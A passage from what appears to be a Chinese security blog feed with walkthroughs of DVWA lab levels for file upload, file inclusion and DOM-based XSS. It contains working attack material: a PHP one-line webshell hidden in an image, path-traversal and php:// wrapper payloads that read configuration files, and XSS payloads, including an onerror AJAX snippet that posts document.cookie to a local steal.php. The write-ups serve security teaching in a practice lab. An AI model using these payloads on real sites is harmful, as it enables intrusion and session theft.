class="line">$target_path=&quot;C:/phpStudy/PHPTutorial/WWW/demo/file-upload/uploaded/&quot;;</span><br><span class="line">$target_path .= basename($name);</span><br><span class="line">if(!move_uploaded_file($tmp_name,$target_path))&#123;</span><br><span class="line">echo &apos;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&apos;;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">echo &quot;&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">echo &apos;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&apos;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>先了解几个函数</p><p>strpos：搜索字符串在另一字符串中第一次出现的位置（区分大小写）</p><p>stripos：搜索字符串在另一字符串中第一次出现的位置（不区分大小写）</p><p>strrpos：搜索字符串在另一字符串中最后一次出现的位置（区分大小写）</p><p>strripos：搜索字符串在另一字符串中最后一次出现的位置（不区分大小写）</p><p>举个例子说明：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$str=<span class="string">"I love php,the greatest language is php."</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> stripos($str,<span class="string">'PHP'</span>).<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> strpos($str,<span class="string">'PHP'</span>).<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> strrpos($str,<span class="string">'PHP'</span>).<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> strrpos($str,<span class="string">'php'</span>).<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> strripos($str,<span class="string">'PHP'</span>).<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>执行结果：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-file-upload/16.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>而getimagesize函数会检测上传文件头，如果不包含相关的图片文件头，则报错</p><p>也就是说我们上传的文件名后缀必须是jpg,jepg,png，而且文件头必须是图像类型</p><p>在上一关中，是对上传文件的类型进行检查，如果不是图片类型则过滤，所以我们可以用burpsuite将发向服务器的请求中的文件名改为.php的后缀，这样类型依然是图片，就能巧妙的绕过过滤</p><p>而这一关是对上传文件的名字进行了检查，名字的后缀必须是.jpg或者.png或者.jpeg，而且文件的头信息必须是图片，上一关的方法修改文件名明显行不通，也就是说我们必须老实上传一个图片文件</p><p>但是我们可以将php代码加入到图片中</p><p>我们先创建一个一句话木马文件和一个图片文件</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-file-upload/17.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>再打开cmd，利用copy命令将两个文件合并为一个文件</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-file-upload/18.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-file-upload/19.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>打开合并后的文件可以看到，一句话木马被加到了最后</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-file-upload/20.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>然后上传</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-file-upload/21.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>成功通过检查</p><p>接下来打开菜刀</p><p>右键添加</p><p><a href="http://127.0.0.1/dvwa/vulnerabilities/fi/?page=file:///C:/phpStudy/PHPTutorial/WWW/dvwa/hackable/uploads/hack.jpg" target="_blank" rel="noopener">http://127.0.0.1/dvwa/vulnerabilities/fi/?page=file:///C:/phpStudy/PHPTutorial/WWW/dvwa/hackable/uploads/hack.jpg</a></p><p>参数名写apple，脚本语言选择php</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-file-upload/22.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>成功拿到webshell</p>]]></content>
    
    <summary type="html">
    
      dvwa-file upload
    
    </summary>
    
      <category term="dvwa-file upload" scheme="https://Foxgrin.github.io/categories/dvwa-file-upload/"/>
    
    
      <category term="file upload" scheme="https://Foxgrin.github.io/tags/file-upload/"/>
    
  </entry>
  
  <entry>
    <title>dvwa-file inclusion</title>
    <link href="https://Foxgrin.github.io//posts/13543/"/>
    <id>https://Foxgrin.github.io//posts/13543/</id>
    <published>2018-07-11T14:16:00.000Z</published>
    <updated>2018-07-12T08:27:35.166Z</updated>
    
    <content type="html"><![CDATA[<p>总结了dvwa中的文件包含漏洞的关卡<a id="more"></a></p><h2 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h2><p>代码复现如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&apos;page&apos;]))&#123;</span><br><span class="line">include($_GET[&apos;page&apos;]);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">header(&quot;location:?page=include.php&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>从源代码可以看出，当用户没有GET一个page值时，会自动给page赋值一个include.php，而这个include.php中就包含了三个文件给用户选择，希望用户能点击这三个文件进行文件包含</p><p>但是从攻击者的角度来看，当然不会乖乖的去点击这三个文件，因为page参数是不经过过滤，我们可以读取我们想要读的文件，前提是文件存在对应的目录。 </p><p>我们先要清楚，如果包含的是php文件，则正确包含，如果不是php文件，则原封不动的将文件内容输出到页面上 </p><p>这里说的php文件不一定是后缀名是php的文件，任何后缀文件只要里面包含了符合php语法的语句，通过文件包含函数include后，里面合法的代码就会被执行</p><p>举个例子，我们先在目录中创建一个phpinfo.txt </p><p>文件内容是：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> phpinfo(); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>然后给服务器GET一个page值为phpinfo.txt</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-file-inclusion/1.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>发现正常显示phpinfo信息，由此可知，只要文件内容符合php语法规范，那么任何扩展名都可以被php解析</p><p>再将phpinfo.txt信息修改为非php语法规范的语句</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-file-inclusion/2.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>同样给服务器GET一个page值为phpinfo.txt</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-file-inclusion/3.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>发现暴露其源代码</p><p>所以我们可以利用这个特性，查看一些配置文件信息</p><p>首先要想查看文件信息，必定要弄清楚目录</p><p>我们先随便输入一个xxx.php</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-file-inclusion/4.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>发现这个文件不存在，报错了，但同时把文件的绝对路径爆出来了</p><p>知道文件路径后，我们就可以查看一些配件文件，比如php配置信息</p><p>输入<a href="http://127.0.0.1/demo/file-inclusion/low.php?page=C:\phpStudy\PHPTutorial\WWW\dvwa/php.ini" target="_blank" rel="noopener">http://127.0.0.1/demo/file-inclusion/low.php?page=C:\phpStudy\PHPTutorial\WWW\dvwa/php.ini</a> </p><p>或者输入../../../../../../../phpStudy/PHPTutorial/WWW/dvwa/php.ini </p><p>输入这么多的../是为了保证能回到根目录下</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-file-inclusion/5.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>再看一下mysql配置信息</p><p>输入<a href="http://127.0.0.1/demo/file-inclusion/low.php?page=C:\phpStudy\PHPTutorial\mysql\my.ini" target="_blank" rel="noopener">http://127.0.0.1/demo/file-inclusion/low.php?page=C:\phpStudy\PHPTutorial\mysql\my.ini</a></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-file-inclusion/6.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>还可以使用php内置封装协议来读取php文件</p><p>输入?php://filter/read=convert.base64-encode/resource=include.php</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-file-inclusion/7.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>发现一段被base64加密过后的php源代码，经过解密后就可以得到php文件原本的代码 </p><p><img src="/img/dvwa-file-inclusion/8.png" alt=""></p><p>再用php://input写入php命令，前提是allow_url_include选项要为on</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-file-inclusion/9.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>在burpsuite中提交数据 </p><p><img src="/img/dvwa-file-inclusion/10.png" alt=""></p><p>发现提交的命令被执行了，那么是不是可以像xss一样提交恶意的脚本代码呢</p><p>我们提交</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert(‘xss’)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-file-inclusion/11.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-file-inclusion/12.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>发现成功执行</p><p>我们再看看可不可以窃取cookie</p><p>输入 </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span><span class="string">"&lt;script src='http://127.0.0.1/demo/xss(stored)/cookie.js'&gt;&lt;/script&gt;"</span>  <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-file-inclusion/13.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-file-inclusion/14.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>发现成功跳转到steal.php</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-file-inclusion/15.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>成功窃取到cookie值 </p><h2 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h2><p>代码复现如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&apos;page&apos;]))&#123;</span><br><span class="line">$page=$_GET[&apos;page&apos;];</span><br><span class="line">$page=str_replace(array(&apos;http://&apos;,&apos;https://&apos;),&apos;&apos;,$page);</span><br><span class="line">$page=str_replace(array(&quot;../&quot;,&quot;..\&quot;&quot;),&apos;&apos;,$page);</span><br><span class="line">//echo $page.&quot;&lt;br&gt;&quot;;</span><br><span class="line">include($page);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">header(&quot;location:?page=include.php&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>可以看出对http:// 和https://，../和..\有过滤，但是因为是str_replace函数，所以双写即可绕过</p><p>而且如果读取绝对路径的话，就没有什么影响</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-file-inclusion/16.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>先看一下当前php文件的绝对路径 </p><p><img src="/img/dvwa-file-inclusion/17.png" alt=""></p><p>复写../构造路径读取php配置文件 </p><p><img src="/img/dvwa-file-inclusion/18.png" alt=""></p><p>读取mysql配置文件</p><p>使用php内置协议读取文件</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-file-inclusion/19.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>任意命令执行 </p><p><img src="/img/dvwa-file-inclusion/20.png" alt=""></p><h2 id="High"><a href="#High" class="headerlink" title="High"></a>High</h2><p>代码复现如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&apos;page&apos;]))&#123;</span><br><span class="line">$page=$_GET[&apos;page&apos;];</span><br><span class="line">if(!fnmatch(&apos;file*&apos;,$page) &amp;&amp; $page != &apos;include.php&apos;)&#123;</span><br><span class="line">echo &quot;ERROR:File not found&quot;;</span><br><span class="line">exit;</span><br><span class="line">&#125;</span><br><span class="line">include($page);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">header(&quot;location:?page=include.php&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>Fnmatch函数作用是在page值中搜索指定模式，指定必须以file开头的字符串才返回true，而我们要执行include，就必须不让if语句执行，所以page值必须以file开头</p><p>看似完全限制了，但是我们可以用file协议进行读取文件</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-file-inclusion/21.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure>]]></content>
    
    <summary type="html">
    
      dvwa-file inclusion
    
    </summary>
    
      <category term="dvwa-file inclusion" scheme="https://Foxgrin.github.io/categories/dvwa-file-inclusion/"/>
    
    
      <category term="file inclusion" scheme="https://Foxgrin.github.io/tags/file-inclusion/"/>
    
  </entry>
  
  <entry>
    <title>dvwa-xss(dom)</title>
    <link href="https://Foxgrin.github.io//posts/61192/"/>
    <id>https://Foxgrin.github.io//posts/61192/</id>
    <published>2018-07-11T13:38:00.000Z</published>
    <updated>2018-07-11T14:11:08.637Z</updated>
    
    <content type="html"><![CDATA[<p>总结了dvwa中的dom型xss关卡<a id="more"></a></p><h2 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h2><p>代码复现如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;form name=&quot;XSS&quot; method=&quot;get&quot;&gt;</span><br><span class="line">&lt;p&gt;Please choose a language:&lt;/p&gt;</span><br><span class="line">&lt;select name=&quot;default&quot;&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">if(document.location.href.indexOf(&apos;default=&apos;)&gt;=0)&#123;</span><br><span class="line">var lang = document.location.href.substring(document.location.href.indexOf(&apos;default=&apos;)+8);</span><br><span class="line">document.write(&quot;&lt;option value=&apos;&quot;+lang+&quot;&apos;&gt;&quot;+decodeURI(lang)+&quot;&lt;/option&gt;&quot;);</span><br><span class="line">document.write(&quot;&lt;option value=&apos;&apos; disabled=&apos;disabled&apos;&gt;----&lt;/option&gt;&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">document.write(&quot;&lt;option value=&apos;English&apos;&gt;English&lt;/option&gt;&quot;);</span><br><span class="line">document.write(&quot;&lt;option value=&apos;French&apos;&gt;French&lt;/option&gt;&quot;);</span><br><span class="line">document.write(&quot;&lt;option value=&apos;Spanish&apos;&gt;Spanish&lt;/option&gt;&quot;);</span><br><span class="line">document.write(&quot;&lt;option value=&apos;German&apos;&gt;German&lt;/option&gt;&quot;);</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/select&gt;</span><br><span class="line">&lt;input type=&apos;submit&apos; value=&apos;Select&apos;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">session_start();</span><br><span class="line">setcookie(&apos;security&apos;,&apos;low&apos;,time()+3600);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这关没有php代码，但是我们可以仔细一步步分析js代码</p><p>首先明白几个对象：</p><p>document:每个载入浏览器的html文档都会成为document对象</p><p>location:location对象包含了当前相关的url信息，href是location对象的属性，location.href能返回完整的URL</p><p>几个方法：</p><p>indexOf：string.indexOf(searchvalue)返回搜索的子字符串在原字符串中第一次出现 的位置，如果搜索的字符串不存在，则返回-1</p><p>substring:string.substring(start，stop)提取字符串中介于两个指定下标之间的字符</p><p>从start处开始提取，到stop位置但不包括stop位置的字符，如果stop参数省略，则返回从start处开始到结束的字符</p><p>明白了这几个对象和方法后再来看这串js代码</p><p>If语句执行条件是检查url中是否含有’default=’这个字符串，如果有则执行if语句</p><p>也就是说if语句执行条件是必须通过GET方式传入一个default值才会执行if语句</p><p>执行之后定义一个变量lang，存储的是url中’default=’之后到结束的字符，也就是default的值</p><p>之后将lang进行url解码然后写入option标签中</p><p>这里没有php代码，也就是并没有与服务器交互，但是我们可以通过dom树解析js代码进行xss注入，也就是通过GET一个default值注入JS代码，然后执行if语句，就可以执行我们注入的JS代码，这就属于dom型的xss</p><p>于是我们输入default:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert(“xss”)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-xss-dom/1.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>果然出现了弹窗</p><p>接下来考虑窃取cookie值</p><p>按之前的方法利用ajax将cookie值传入steal.php，再将cookie值写入数据库</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-xss-dom/2.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-xss-dom/3.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>成功截取到cookie值</p><h2 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h2><p>代码复现如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&lt;form name=&quot;XSS&quot; method=&quot;get&quot;&gt;</span><br><span class="line">&lt;p&gt;Please choose a language:&lt;/p&gt;</span><br><span class="line">&lt;select name=&quot;default&quot;&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">if(document.location.href.indexOf(&quot;default=&quot;)&gt;=0)&#123;</span><br><span class="line">var lang = document.location.href.substring(document.location.href.indexOf(&quot;default=&quot;)+8);</span><br><span class="line">document.write(&quot;&lt;option value=&apos;&quot;+lang+&quot;&apos;&gt;&quot;+decodeURI(lang)+&quot;&lt;/option&gt;&quot;);</span><br><span class="line">document.write(&quot;&lt;option value=&apos;&apos; disabled=&apos;disabled&apos;&gt;----&lt;/option&gt;&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">document.write(&quot;&lt;option value=&apos;English&apos;&gt;English&lt;/option&gt;&quot;);</span><br><span class="line">document.write(&quot;&lt;option value=&apos;French&apos;&gt;French&lt;/option&gt;&quot;);</span><br><span class="line">document.write(&quot;&lt;option value=&apos;Spanish&apos;&gt;Spanish&lt;/option&gt;&quot;);</span><br><span class="line">document.write(&quot;&lt;option value=&apos;German&apos;&gt;German&lt;/option&gt;&quot;);</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/select&gt;</span><br><span class="line">&lt;input type=&apos;submit&apos; value=&apos;Select&apos;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">session_start();</span><br><span class="line">setcookie(&apos;security&apos;,&apos;medium&apos;,time()+3600);</span><br><span class="line"></span><br><span class="line">if(array_key_exists(&apos;default&apos;,$_GET) &amp;&amp; $_GET[&apos;default&apos;] != NULL)&#123;</span><br><span class="line">if(stripos($_GET[&apos;default&apos;],&apos;&lt;script&apos;) !== false)&#123;</span><br><span class="line">header(&quot;location:?default=English&quot;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>可以看出在服务器端对GET的default值进行了过滤，一旦检测到defalut值中含有&lt;script，就立刻重定向到default值为English的页面</p><p>解决方法是利用字符#，该字符后的数据不会发送到服务器端，从而绕过服务器的过滤，输入</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#default=<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert(“xss”)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-xss-dom/4.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>在输入 </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#default=<span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">”http://127.0.0.1/demo/xss(stored)/cookie.js”</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-xss-dom/5.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>成功窃取到cookie值 </p><p>还有一种方法就是通过触发onerror事件来执行js代码</p><p>输入 </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">#</span> <span class="attr">onerror</span>=<span class="string">(alert(”xss”))</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-xss-dom/6.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>但是发现并没有弹框，为什么呢，仔细看一下代码发现img标签是包含在option标签里面的，所以img标签并不会被解析</p><p>这里要闭合option标签和select标签才可以解析出img标签</p><p>输入 </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;/<span class="name">option</span>&gt;</span><span class="tag">&lt;/<span class="name">select</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">#</span> <span class="attr">onerror</span>=<span class="string">(alert(‘xss’))</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-xss-dom/7.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>成功弹框</p><p>但是因为我们提前闭合了option和select标签，所以后面的select结构都会被破坏，整个页面结构都被破坏了，所以这种方法并不是很实用</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-xss-dom/8.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>再试试通过onerror事件执行ajax代码，将cookie值发送给steal.php，然后写入数据库 </p><p>输入 </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">#</span> <span class="attr">onerror</span>=<span class="string">'var url="http://127.0.0.1/demo/xss(reflected)/steal.php";var postStr="data="+document.cook&amp;#x69;e;var ajax=null;&amp;#x69;f(w&amp;#x69;ndow.XMLHttpRequest)&#123;ajax=new XMLHttpRequest();&#125;else &amp;#x69;f(w&amp;#x69;ndow.Act&amp;#x69;veXObject)&#123;ajax=new Act&amp;#x69;veXObject("M&amp;#x69;crosoft.XMLHTTP");&#125;else&#123;ajax=null;&#125;ajax.open("POST", url, true);ajax.setRequestHeader("Content-Type", "appl&amp;#x69;cat&amp;#x69;on/x-www-form-urlencoded");ajax.send(postStr);'</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-xss-dom/9.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>成功截取到cookie值 </p><h2 id="High"><a href="#High" class="headerlink" title="High"></a>High</h2><p>代码复现如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&lt;form name=&quot;XSS&quot; method=&quot;get&quot;&gt;</span><br><span class="line">&lt;p&gt;Please choose a language:&lt;/p&gt;</span><br><span class="line">&lt;select name=&quot;default&quot;&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">if(document.location.href.indexOf(&quot;default=&quot;)&gt;=0)&#123;</span><br><span class="line">var lang = document.location.href.substring(document.location.href.indexOf(&quot;default=&quot;)+8);</span><br><span class="line">document.write(&quot;&lt;option value=&apos;&quot;+lang+&quot;&apos;&gt;&quot;+decodeURI(lang)+&quot;&lt;/option&gt;&quot;);</span><br><span class="line">document.write(&quot;&lt;option value=&apos;&apos; disabled=&apos;disabled&apos;&gt;----&lt;/option&gt;&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">document.write(&quot;&lt;option value=&apos;English&apos;&gt;English&lt;/option&gt;&quot;);</span><br><span class="line">document.write(&quot;&lt;option 